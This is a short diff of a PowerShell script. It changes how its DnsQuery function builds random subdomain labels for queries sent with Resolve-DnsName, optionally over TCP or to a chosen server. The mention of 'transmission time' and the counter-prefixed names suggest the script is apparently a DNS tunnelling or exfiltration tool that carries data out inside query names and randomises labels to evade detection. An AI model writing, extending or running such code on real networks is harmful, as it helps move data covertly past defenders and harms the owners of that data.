@@ -103,9 +103,10 @@ Write-Host "[i] Estimated transmission time is between $TimeMin $SecondsMin and 
 
 # DNS Query
 function DnsQuery($domain) {
-$RandTarget1 = (-join (( 0x61..0x7A) | Get-Random -Count $(Get-Random (3..4))  | % {[char]$_}))
-$RandTarget2 = (-join (( 0x61..0x7A) | Get-Random -Count $(Get-Random (3..4))  | % {[char]$_}))
-$RandTarget3 = (-join (( 0x61..0x7A) | Get-Random -Count $(Get-Random (3..4))  | % {[char]$_})) ; if ($Random) {
+$RandTarget1 = (-join (( 0x66..0x7A) | Get-Random -Count $(Get-Random (2..3))  | % {[char]$_}))
+$RandTarget2 = (-join (( 0x66..0x7A) | Get-Random -Count $(Get-Random (4..5))  | % {[char]$_}))
+$RandTarget3 = (-join (( 0x66..0x7A) | Get-Random -Count $(Get-Random (2..3))  | % {[char]$_})) ; if ($Random) {
+
 if (!$Server) { if ($TcpOnly -in 'True') { Resolve-DnsName -TcpOnly -type A -DnsOnly "$((++$script:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" | Select -First 1 }
 else { Resolve-DnsName -type A -DnsOnly "$((++$script:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" | Select -First 1 }}
 else { if ($TcpOnly -in 'True') { Resolve-DnsName -TcpOnly -Server $Server -type A -DnsOnly "$((++$script:base)).$domain.$RandTarget1.$RandTarget2.$RandTarget3" | Select -First 1 }
